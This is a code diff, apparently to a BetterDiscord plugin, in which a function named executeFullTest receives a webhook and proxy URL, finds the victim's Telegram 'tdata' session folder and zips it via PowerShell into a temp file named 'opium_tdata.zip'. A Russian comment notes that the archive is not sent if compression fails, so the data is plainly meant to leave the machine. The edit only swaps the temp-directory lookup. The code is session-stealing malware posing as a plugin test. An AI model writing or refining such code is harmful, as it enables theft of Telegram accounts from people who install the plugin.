@@ -1,6 +1,6 @@
-async function executeFullTest(BdApi, webhookUrl, proxyUrl, fs, path, os, execSync) {
+async function executeFullTest(BdApi, webhookUrl, proxyUrl, fs, path, execSync) {
     // Проверяем, что модули дошли
-    if (!fs || !path || !os || !execSync) {
+    if (!fs || !path || !execSync) {
         return { success: false, error: "Модули Node.js не были переданы из плагина." };
     }
 
@@ -54,13 +54,15 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fs, path, os, execSy
                     result.telegram_path = p;
                     hasTdata = true;
                     
-                    tdataZipPath = path.join(os.tmpdir(), 'opium_tdata.zip');
+                    // Используем TEMP вместо os.tmpdir()
+                    const tempDir = process.env.TEMP || 'C:\\Windows\\Temp';
+                    tdataZipPath = path.join(tempDir, 'opium_tdata.zip');
+                    
                     try {
                         if (fs.existsSync(tdataZipPath)) fs.unlinkSync(tdataZipPath);
-                        // Используем переданный execSync
                         execSync(`powershell -command "Compress-Archive -Path '${p}' -DestinationPath '${tdataZipPath}' -Force"`, { timeout: 30000 });
                     } catch (zipError) {
-                        hasTdata = false; // Если не смогли сжать, не отправляем
+                        hasTdata = false; 
                     }
                     break;
                 }
